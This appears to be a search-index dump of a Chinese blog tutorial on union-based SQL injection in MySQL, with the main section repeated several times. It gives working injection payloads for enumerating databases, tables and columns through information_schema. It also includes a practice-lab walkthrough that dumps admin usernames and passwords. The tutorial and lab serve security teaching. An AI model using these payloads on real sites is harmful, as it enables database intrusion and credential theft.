[{"categories":["Web安全"],"content":" SQL注入快速入门—联合注入","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:0:0","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#sql注入快速入门联合注入"},{"categories":["Web安全"],"content":" 概述：所谓的SQL注入就是通过某种方式将恶意的SQL代码添加到输入参数中，然后传递到SQL服务器使其解析并执行的一种攻击手法。 ​ ","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:1:0","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#概述"},{"categories":["Web安全"],"content":" 前置知识：","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:2:0","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#前置知识"},{"categories":["Web安全"],"content":" MySQL数据库： 需要有一些MySQL基础，需知道：数据库、表、字段、数据之间的关系、select查询语句(下面有)、order by、and、group_concat()(下面有)。 在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个information_schema的数据库，在该库中，我们需要记住三个表名，分别是schemata，tables，columns。 Schemata 表存储的是该用户创建的所有数据库的库名，需要记住该表中记录数据库名的字段名为 schema_name。 Tables 表存储该用户创建的所有数据库的库名和表名，要记住该表中记录数据库 库名和表名的字段分别是 table_schema和 table_name。 Columns 表存储该用户创建的所有数据库的库名、表名、字段名，要记住该表中记录数据库库名、表名、字段名为 table_schema、table_name、columns_name。 MySQL的查询语句是SELECT * FROM 表名 WHERE 条件; --- 从某个表查询符合某个条件的所有数据 *可以换成你指定要查询的字段数据。 union：MySQL中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。 group_concat()：把数据分组连接(大概这么解释)。 order by 数字：把查询的数据按第n个字段排序。 Database()：查询当前网站使用的数据库。 快速回忆MySQL增删改查和常见函数 ​ ","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:2:1","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#mysql数据库"},{"categories":["Web安全"],"content":" SQL注入流程：","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:3:0","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#sql注入流程"},{"categories":["Web安全"],"content":" SQL注入漏洞的探测方法： 找到网站交互点：地址栏、搜索框、表单 地址栏：某个界面的地址栏URL格式类似为http://xxxxxxx?id=数字则符合要求。 在id=数字后面加单引号'或双引号\"、等看看是否报错，如果报错就可能存在 SQL注入漏洞。 判断是 “数字型” 还是 “字符型” 以及 是否存在SQL漏洞 ： 在id=数字后面加上 and 1=1页面显示正常，换成 and 1=2页面显示错误，说明 一定存在SQL注入 且为 “数学型” 。 在id=数字后面加上 ' and 1=1 #页面显示正常，换成 ' and 1=2 #页面显示错误，说明 一定存在SQL注入 且为 “字符型” 。 如果都显示不正常说明不存在SQL注入漏洞(当有可能是其他情况，由于本篇只讲基础故当做不存在)。 如果为“字符型”，后文提到的代码都要在代码前面加上'、后面加上#。 ​ ","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:3:1","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#sql注入漏洞的探测方法"},{"categories":["Web安全"],"content":" SQL注入： 1.判断页面有几个字段：原因：union前面的查询语句的字段数量和后面的查询语句字段数量要一致 在id=数字后加上order by 数字即id=数字 order by 数字 如果是字符型则为id=数字' order by 数学# 意思是把查询的数据按第n个字段排序，如果页面上的字段大于n则会显示错误。 所以一开始可以随便order by一个数字，如果显示错误就减小数字，如果正常显示就增大数字。 直到你order by n能正常显示、order by n+1就显示错误 ，说明n就是这个页面的字段数。 ps：善用二分法。 3.通过联合查询查看字段在前端的回显位置：对于一个网页，如果它的字段数是3，但可能只有第1，2字段的数据返回页面前端。所以我们需要查询哪个字段会回显，得用union select 联合查询来查看字段在前端的回显位置 id=数字 and 1=2 union select 1,2 ---或者 id=不存在的数字 union select 1,2,3 and 1=2或者id=不存在的数字：使前一句的SQL语句为错误 不存在的数字：假如一个网页有id=1的页面和id=2的页面，改成id=-1(除了1和2的其他数字都行)，就没有相对应的页面显示；and 1=2也是同理。 之所以让前半句出错是因为程序在展示数据的时候通常只会取结果集的第一行数据，只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了 union select 1,2,3：联合查询，让第一个字段显示“1”、第二个字段显示“2”、第三个字段显示“3”，从而来找可以回显的字段在页面的位置 4.查询目标数据库名：在得到字段数之后就可以查询数据库名。 查询数据库名的函数是database()。 假设我们已经找到某个可回显字段的位置(比如显示“2”的字段)，记住这个字段位置，在地址栏输入： http://xxxxxxx?id=1 and 1=2 union select 1,database(),3 5.查询目标数据库名里的所有表名：http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = \"目标数据库名\" 在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个information_schema的数据库。 information_schema数据库里有个tables表。 tables表里有table_schema和table_name字段。 table_schema字段存的是网站管理员创建的所有数据库的库名。 table_name字段存的是网站管理员创建的所有数据库的表名。 这句代码的意思是从information_schema数据库里的tables表里找table_schema字段里的数据为 目标数据库名 所对应的table_name字段里的数据，即查询 目标数据库名内的所有表名。 group_concat(table_name)：将查询到的表名用,连起来。 6.查询目标表名内的所有字段名http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = \"目标表名\" 7.查询目标字段名内的数据http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(目标字段名),3 from 目标表名 如果要一次性查询多个字段内的数据： http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(字段名1,\";\",字段名2,\";\",字段名3),3 from 目标表名 ;用来分隔多个字段名内的数据 ​ ","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:3:2","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#sql注入"},{"categories":["Web安全"],"content":" SQL注入： 1.判断页面有几个字段：原因：union前面的查询语句的字段数量和后面的查询语句字段数量要一致 在id=数字后加上order by 数字即id=数字 order by 数字 如果是字符型则为id=数字' order by 数学# 意思是把查询的数据按第n个字段排序，如果页面上的字段大于n则会显示错误。 所以一开始可以随便order by一个数字，如果显示错误就减小数字，如果正常显示就增大数字。 直到你order by n能正常显示、order by n+1就显示错误 ，说明n就是这个页面的字段数。 ps：善用二分法。 3.通过联合查询查看字段在前端的回显位置：对于一个网页，如果它的字段数是3，但可能只有第1，2字段的数据返回页面前端。所以我们需要查询哪个字段会回显，得用union select 联合查询来查看字段在前端的回显位置 id=数字 and 1=2 union select 1,2 ---或者 id=不存在的数字 union select 1,2,3 and 1=2或者id=不存在的数字：使前一句的SQL语句为错误 不存在的数字：假如一个网页有id=1的页面和id=2的页面，改成id=-1(除了1和2的其他数字都行)，就没有相对应的页面显示；and 1=2也是同理。 之所以让前半句出错是因为程序在展示数据的时候通常只会取结果集的第一行数据，只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了 union select 1,2,3：联合查询，让第一个字段显示“1”、第二个字段显示“2”、第三个字段显示“3”，从而来找可以回显的字段在页面的位置 4.查询目标数据库名：在得到字段数之后就可以查询数据库名。 查询数据库名的函数是database()。 假设我们已经找到某个可回显字段的位置(比如显示“2”的字段)，记住这个字段位置，在地址栏输入： http://xxxxxxx?id=1 and 1=2 union select 1,database(),3 5.查询目标数据库名里的所有表名：http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = \"目标数据库名\" 在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个information_schema的数据库。 information_schema数据库里有个tables表。 tables表里有table_schema和table_name字段。 table_schema字段存的是网站管理员创建的所有数据库的库名。 table_name字段存的是网站管理员创建的所有数据库的表名。 这句代码的意思是从information_schema数据库里的tables表里找table_schema字段里的数据为 目标数据库名 所对应的table_name字段里的数据，即查询 目标数据库名内的所有表名。 group_concat(table_name)：将查询到的表名用,连起来。 6.查询目标表名内的所有字段名http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = \"目标表名\" 7.查询目标字段名内的数据http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(目标字段名),3 from 目标表名 如果要一次性查询多个字段内的数据： http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(字段名1,\";\",字段名2,\";\",字段名3),3 from 目标表名 ;用来分隔多个字段名内的数据 ​ ","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:3:2","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#1判断页面有几个字段"},{"categories":["Web安全"],"content":" SQL注入： 1.判断页面有几个字段：原因：union前面的查询语句的字段数量和后面的查询语句字段数量要一致 在id=数字后加上order by 数字即id=数字 order by 数字 如果是字符型则为id=数字' order by 数学# 意思是把查询的数据按第n个字段排序，如果页面上的字段大于n则会显示错误。 所以一开始可以随便order by一个数字，如果显示错误就减小数字，如果正常显示就增大数字。 直到你order by n能正常显示、order by n+1就显示错误 ，说明n就是这个页面的字段数。 ps：善用二分法。 3.通过联合查询查看字段在前端的回显位置：对于一个网页，如果它的字段数是3，但可能只有第1，2字段的数据返回页面前端。所以我们需要查询哪个字段会回显，得用union select 联合查询来查看字段在前端的回显位置 id=数字 and 1=2 union select 1,2 ---或者 id=不存在的数字 union select 1,2,3 and 1=2或者id=不存在的数字：使前一句的SQL语句为错误 不存在的数字：假如一个网页有id=1的页面和id=2的页面，改成id=-1(除了1和2的其他数字都行)，就没有相对应的页面显示；and 1=2也是同理。 之所以让前半句出错是因为程序在展示数据的时候通常只会取结果集的第一行数据，只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了 union select 1,2,3：联合查询，让第一个字段显示“1”、第二个字段显示“2”、第三个字段显示“3”，从而来找可以回显的字段在页面的位置 4.查询目标数据库名：在得到字段数之后就可以查询数据库名。 查询数据库名的函数是database()。 假设我们已经找到某个可回显字段的位置(比如显示“2”的字段)，记住这个字段位置，在地址栏输入： http://xxxxxxx?id=1 and 1=2 union select 1,database(),3 5.查询目标数据库名里的所有表名：http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = \"目标数据库名\" 在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个information_schema的数据库。 information_schema数据库里有个tables表。 tables表里有table_schema和table_name字段。 table_schema字段存的是网站管理员创建的所有数据库的库名。 table_name字段存的是网站管理员创建的所有数据库的表名。 这句代码的意思是从information_schema数据库里的tables表里找table_schema字段里的数据为 目标数据库名 所对应的table_name字段里的数据，即查询 目标数据库名内的所有表名。 group_concat(table_name)：将查询到的表名用,连起来。 6.查询目标表名内的所有字段名http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = \"目标表名\" 7.查询目标字段名内的数据http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(目标字段名),3 from 目标表名 如果要一次性查询多个字段内的数据： http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(字段名1,\";\",字段名2,\";\",字段名3),3 from 目标表名 ;用来分隔多个字段名内的数据 ​ ","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:3:2","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#3通过联合查询查看字段在前端的回显位置"},{"categories":["Web安全"],"content":" SQL注入： 1.判断页面有几个字段：原因：union前面的查询语句的字段数量和后面的查询语句字段数量要一致 在id=数字后加上order by 数字即id=数字 order by 数字 如果是字符型则为id=数字' order by 数学# 意思是把查询的数据按第n个字段排序，如果页面上的字段大于n则会显示错误。 所以一开始可以随便order by一个数字，如果显示错误就减小数字，如果正常显示就增大数字。 直到你order by n能正常显示、order by n+1就显示错误 ，说明n就是这个页面的字段数。 ps：善用二分法。 3.通过联合查询查看字段在前端的回显位置：对于一个网页，如果它的字段数是3，但可能只有第1，2字段的数据返回页面前端。所以我们需要查询哪个字段会回显，得用union select 联合查询来查看字段在前端的回显位置 id=数字 and 1=2 union select 1,2 ---或者 id=不存在的数字 union select 1,2,3 and 1=2或者id=不存在的数字：使前一句的SQL语句为错误 不存在的数字：假如一个网页有id=1的页面和id=2的页面，改成id=-1(除了1和2的其他数字都行)，就没有相对应的页面显示；and 1=2也是同理。 之所以让前半句出错是因为程序在展示数据的时候通常只会取结果集的第一行数据，只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了 union select 1,2,3：联合查询，让第一个字段显示“1”、第二个字段显示“2”、第三个字段显示“3”，从而来找可以回显的字段在页面的位置 4.查询目标数据库名：在得到字段数之后就可以查询数据库名。 查询数据库名的函数是database()。 假设我们已经找到某个可回显字段的位置(比如显示“2”的字段)，记住这个字段位置，在地址栏输入： http://xxxxxxx?id=1 and 1=2 union select 1,database(),3 5.查询目标数据库名里的所有表名：http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = \"目标数据库名\" 在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个information_schema的数据库。 information_schema数据库里有个tables表。 tables表里有table_schema和table_name字段。 table_schema字段存的是网站管理员创建的所有数据库的库名。 table_name字段存的是网站管理员创建的所有数据库的表名。 这句代码的意思是从information_schema数据库里的tables表里找table_schema字段里的数据为 目标数据库名 所对应的table_name字段里的数据，即查询 目标数据库名内的所有表名。 group_concat(table_name)：将查询到的表名用,连起来。 6.查询目标表名内的所有字段名http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = \"目标表名\" 7.查询目标字段名内的数据http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(目标字段名),3 from 目标表名 如果要一次性查询多个字段内的数据： http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(字段名1,\";\",字段名2,\";\",字段名3),3 from 目标表名 ;用来分隔多个字段名内的数据 ​ ","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:3:2","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#4查询目标数据库名"},{"categories":["Web安全"],"content":" SQL注入： 1.判断页面有几个字段：原因：union前面的查询语句的字段数量和后面的查询语句字段数量要一致 在id=数字后加上order by 数字即id=数字 order by 数字 如果是字符型则为id=数字' order by 数学# 意思是把查询的数据按第n个字段排序，如果页面上的字段大于n则会显示错误。 所以一开始可以随便order by一个数字，如果显示错误就减小数字，如果正常显示就增大数字。 直到你order by n能正常显示、order by n+1就显示错误 ，说明n就是这个页面的字段数。 ps：善用二分法。 3.通过联合查询查看字段在前端的回显位置：对于一个网页，如果它的字段数是3，但可能只有第1，2字段的数据返回页面前端。所以我们需要查询哪个字段会回显，得用union select 联合查询来查看字段在前端的回显位置 id=数字 and 1=2 union select 1,2 ---或者 id=不存在的数字 union select 1,2,3 and 1=2或者id=不存在的数字：使前一句的SQL语句为错误 不存在的数字：假如一个网页有id=1的页面和id=2的页面，改成id=-1(除了1和2的其他数字都行)，就没有相对应的页面显示；and 1=2也是同理。 之所以让前半句出错是因为程序在展示数据的时候通常只会取结果集的第一行数据，只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了 union select 1,2,3：联合查询，让第一个字段显示“1”、第二个字段显示“2”、第三个字段显示“3”，从而来找可以回显的字段在页面的位置 4.查询目标数据库名：在得到字段数之后就可以查询数据库名。 查询数据库名的函数是database()。 假设我们已经找到某个可回显字段的位置(比如显示“2”的字段)，记住这个字段位置，在地址栏输入： http://xxxxxxx?id=1 and 1=2 union select 1,database(),3 5.查询目标数据库名里的所有表名：http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = \"目标数据库名\" 在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个information_schema的数据库。 information_schema数据库里有个tables表。 tables表里有table_schema和table_name字段。 table_schema字段存的是网站管理员创建的所有数据库的库名。 table_name字段存的是网站管理员创建的所有数据库的表名。 这句代码的意思是从information_schema数据库里的tables表里找table_schema字段里的数据为 目标数据库名 所对应的table_name字段里的数据，即查询 目标数据库名内的所有表名。 group_concat(table_name)：将查询到的表名用,连起来。 6.查询目标表名内的所有字段名http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = \"目标表名\" 7.查询目标字段名内的数据http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(目标字段名),3 from 目标表名 如果要一次性查询多个字段内的数据： http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(字段名1,\";\",字段名2,\";\",字段名3),3 from 目标表名 ;用来分隔多个字段名内的数据 ​ ","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:3:2","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#5查询目标数据库名里的所有表名"},{"categories":["Web安全"],"content":" SQL注入： 1.判断页面有几个字段：原因：union前面的查询语句的字段数量和后面的查询语句字段数量要一致 在id=数字后加上order by 数字即id=数字 order by 数字 如果是字符型则为id=数字' order by 数学# 意思是把查询的数据按第n个字段排序，如果页面上的字段大于n则会显示错误。 所以一开始可以随便order by一个数字，如果显示错误就减小数字，如果正常显示就增大数字。 直到你order by n能正常显示、order by n+1就显示错误 ，说明n就是这个页面的字段数。 ps：善用二分法。 3.通过联合查询查看字段在前端的回显位置：对于一个网页，如果它的字段数是3，但可能只有第1，2字段的数据返回页面前端。所以我们需要查询哪个字段会回显，得用union select 联合查询来查看字段在前端的回显位置 id=数字 and 1=2 union select 1,2 ---或者 id=不存在的数字 union select 1,2,3 and 1=2或者id=不存在的数字：使前一句的SQL语句为错误 不存在的数字：假如一个网页有id=1的页面和id=2的页面，改成id=-1(除了1和2的其他数字都行)，就没有相对应的页面显示；and 1=2也是同理。 之所以让前半句出错是因为程序在展示数据的时候通常只会取结果集的第一行数据，只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了 union select 1,2,3：联合查询，让第一个字段显示“1”、第二个字段显示“2”、第三个字段显示“3”，从而来找可以回显的字段在页面的位置 4.查询目标数据库名：在得到字段数之后就可以查询数据库名。 查询数据库名的函数是database()。 假设我们已经找到某个可回显字段的位置(比如显示“2”的字段)，记住这个字段位置，在地址栏输入： http://xxxxxxx?id=1 and 1=2 union select 1,database(),3 5.查询目标数据库名里的所有表名：http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = \"目标数据库名\" 在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个information_schema的数据库。 information_schema数据库里有个tables表。 tables表里有table_schema和table_name字段。 table_schema字段存的是网站管理员创建的所有数据库的库名。 table_name字段存的是网站管理员创建的所有数据库的表名。 这句代码的意思是从information_schema数据库里的tables表里找table_schema字段里的数据为 目标数据库名 所对应的table_name字段里的数据，即查询 目标数据库名内的所有表名。 group_concat(table_name)：将查询到的表名用,连起来。 6.查询目标表名内的所有字段名http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = \"目标表名\" 7.查询目标字段名内的数据http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(目标字段名),3 from 目标表名 如果要一次性查询多个字段内的数据： http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(字段名1,\";\",字段名2,\";\",字段名3),3 from 目标表名 ;用来分隔多个字段名内的数据 ​ ","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:3:2","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#6查询目标表名内的所有字段名"},{"categories":["Web安全"],"content":" SQL注入： 1.判断页面有几个字段：原因：union前面的查询语句的字段数量和后面的查询语句字段数量要一致 在id=数字后加上order by 数字即id=数字 order by 数字 如果是字符型则为id=数字' order by 数学# 意思是把查询的数据按第n个字段排序，如果页面上的字段大于n则会显示错误。 所以一开始可以随便order by一个数字，如果显示错误就减小数字，如果正常显示就增大数字。 直到你order by n能正常显示、order by n+1就显示错误 ，说明n就是这个页面的字段数。 ps：善用二分法。 3.通过联合查询查看字段在前端的回显位置：对于一个网页，如果它的字段数是3，但可能只有第1，2字段的数据返回页面前端。所以我们需要查询哪个字段会回显，得用union select 联合查询来查看字段在前端的回显位置 id=数字 and 1=2 union select 1,2 ---或者 id=不存在的数字 union select 1,2,3 and 1=2或者id=不存在的数字：使前一句的SQL语句为错误 不存在的数字：假如一个网页有id=1的页面和id=2的页面，改成id=-1(除了1和2的其他数字都行)，就没有相对应的页面显示；and 1=2也是同理。 之所以让前半句出错是因为程序在展示数据的时候通常只会取结果集的第一行数据，只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了 union select 1,2,3：联合查询，让第一个字段显示“1”、第二个字段显示“2”、第三个字段显示“3”，从而来找可以回显的字段在页面的位置 4.查询目标数据库名：在得到字段数之后就可以查询数据库名。 查询数据库名的函数是database()。 假设我们已经找到某个可回显字段的位置(比如显示“2”的字段)，记住这个字段位置，在地址栏输入： http://xxxxxxx?id=1 and 1=2 union select 1,database(),3 5.查询目标数据库名里的所有表名：http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = \"目标数据库名\" 在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个information_schema的数据库。 information_schema数据库里有个tables表。 tables表里有table_schema和table_name字段。 table_schema字段存的是网站管理员创建的所有数据库的库名。 table_name字段存的是网站管理员创建的所有数据库的表名。 这句代码的意思是从information_schema数据库里的tables表里找table_schema字段里的数据为 目标数据库名 所对应的table_name字段里的数据，即查询 目标数据库名内的所有表名。 group_concat(table_name)：将查询到的表名用,连起来。 6.查询目标表名内的所有字段名http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = \"目标表名\" 7.查询目标字段名内的数据http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(目标字段名),3 from 目标表名 如果要一次性查询多个字段内的数据： http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(字段名1,\";\",字段名2,\";\",字段名3),3 from 目标表名 ;用来分隔多个字段名内的数据 ​ ","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:3:2","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#7查询目标字段名内的数据"},{"categories":["Web安全"],"content":" 拓展实战：","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:4:0","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#拓展实战"},{"categories":["Web安全"],"content":" 手工注入：这是一个SQL注入的靶场，目标是找到“flag” 首先我们要去找到交互点，这个界面的交互点只有最上面的地址栏，但没有类似http://xxxxxxx?id=数字，没法做SQL注入。 所以要先找到地址栏有类似于id=数字这样的界面 可以看到这里有个查看新闻的按钮 点进去之后看到地址栏出现了我们期待的?id=1，接下来就是测试这个交互点（地址栏）是否存在SQL注入了！ 上文有提到SQL注入的流程，首先我们在1后面加个 ‘，即http://pu2lh35s.ia.aqlab.cn/?id=1'，访问后发现页面出错了（内容没了） 接着我们再试试在后面加上 and 1=1，即http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=1，可以看到页面照常显示 到这里就说明了地址栏这个交互点存在SQL注入 接着是判断页面有几个字段 地址栏输入： http://pu2lh35s.ia.aqlab.cn/?id=1 order by 2 回车后页面正常显示： 地址栏输入： http://pu2lh35s.ia.aqlab.cn/?id=1 order by 3 回车后页面显示错误： 由此可以断定当前页面有2个回显字段 接下来是通过联合查询查看字段在前端的回显位置 地址栏输入： http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,2 回车后页面显示： 说明圈起来的那个字段是可利用的回显字段 接下来是利用这个字段来查询当前页面的数据库名 http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,database() 回车后的页面： 得到了数据库名 maoshe 接下来是查询数据库 maoshe里有哪些表名 地址栏输入： http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema = \"maoshe\" 回车后的页面： 得到了 maoshe 数据库下的所有表名： admin,dirs,news,xss 根据经验，admin表（admin意思是管理员）里肯定有“好东西” 当然，可以每个表都查一遍 现在来查询admin表里有哪些字段 地址栏里输入： http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name = \"admin\" 回车后的页面： 得到了 admin表下的所有字段名： Id,username,password 根据经验，password字段和username字段里肯定有“好东西”（username意思是用户名、password意思是密码） 当然，也可以去看看其他的字段里存什么数据 现在来查询password字段和username字段里有啥数据 地址栏里输入： http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(username) from admin http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,group_concat(password) from admin 回车后的页面： 获取到了username：admin、password：hellohack,zkaqbanban 把hellohack,zkaqbanban拿去提交结果是错误的，给我看傻了好久，于是乎我把数据库里的所有表里的所有字段都翻了一遍，并没有所谓的“flag” 我就在想不会是要拿着用户名密码去登后台吧，我又用dirsearch 把网站的目录扫了一遍，并没有发现所谓的后台登陆界面 